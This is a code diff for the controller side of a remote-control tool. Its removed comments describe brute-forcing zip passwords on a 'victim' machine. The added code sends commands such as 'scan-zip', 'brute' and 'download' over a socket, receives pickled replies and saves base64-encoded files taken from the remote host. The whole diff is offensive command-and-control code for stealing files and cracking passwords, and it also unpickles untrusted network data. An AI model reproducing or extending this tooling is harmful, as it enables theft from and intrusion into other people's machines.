@@ -7,12 +7,10 @@ import threading
 import signal
 import pickle
 import subprocess
-
-# Allow the user to chose which zip file to zip
-# If the user wants can choose to brute force all the zip files at the same time
-# Bruteforce the File the user chooses, and once password is found, download it 
-# Check websites for wordlists online 
-# Be able to allow to upload a wordlist to the victim and use that to bruteforce
+import inspect
+import base64
+import time
+import sys
 
 class Parser:
 	def __init__(self):
@@ -79,19 +77,48 @@ class Socket(Parser):
 
 		self.start_connection()
 
+	def reliable_recieve(self):
+		command_list = ["download", "scan-zip"]
+		my_list = []
+
+		if self.user_input[0] in command_list:
+			self.connection.settimeout(0.50)
+
+		if self.user_input[0] == "brute":
+			self.connection.setblocking(True)
+			
+		else:
+			self.connection.settimeout(0.05)
+
+		while True:
+			try:
+				pickle_data = self.connection.recv(4096)
+				my_list.append(pickle_data)
+				if self.connection.getblocking():
+					return b"".join(my_list)
+			except socket.timeout:
+				return b"".join(my_list)
+
 	def reliable_send_recieve(self, data):
 		data_list = pickle.dumps(data)
 		self.connection.send(data_list)
-		result = self.connection.recv(4096)
-		return result
+		return self.reliable_recieve()
 
 	def clear(self):
 		return subprocess.call("clear", shell=True)
 
+	def download_file(self, file):
+		decode = base64.b64decode(file)
+		with open(self.user_input[1], "wb") as f:
+			f.write(decode)
+			f.close()
+		print("[+] File downloaded")
+
 
 	def command_options(self):
 		return {
-			"clear": self.clear
+			"clear": self.clear,
+			"download": self.download_file
 		}
 
 	def start_connection(self):
@@ -99,21 +126,29 @@ class Socket(Parser):
 		get_command_options = self.command_options()
 
 		while True:
-			user_input = input(">> ")
-			user_input = user_input.split()
-			result = self.reliable_send_recieve(user_input)
+			try:
+				self.user_input = input(">> ")
+				self.user_input = self.user_input.split()
+				result = self.reliable_send_recieve(self.user_input)
 
-			if user_input[0] == "scan-zip":
-				print("[+] Printing Zip files")
-				result = pickle.loads(result)
-				for words in result:
-					print(words)
+				if self.user_input[0] == "scan-zip":
+					print("[+] Printing Zip files")
+					result = pickle.loads(result)
+					for words in result:
+						print(words)
 
-			elif user_input[0] in get_command_options:
-				get_command_options[user_input[0]]()
-
-			else:
-				print(result.decode())
+				elif self.user_input[0] in get_command_options:
+					if len(inspect.getfullargspec(get_command_options[self.user_input[0]])[0]) > 1:
+						get_command_options[self.user_input[0]](result)  # put the indexes here
+						continue
+					else:
+						get_command_options[self.user_input[0]]()
+					print(result.decode())
+				else:
+					print(result.decode())
+			except IndexError:
+				print("[-] Invalid command")
+				continue
 
 
 class ZipFile(Parser):
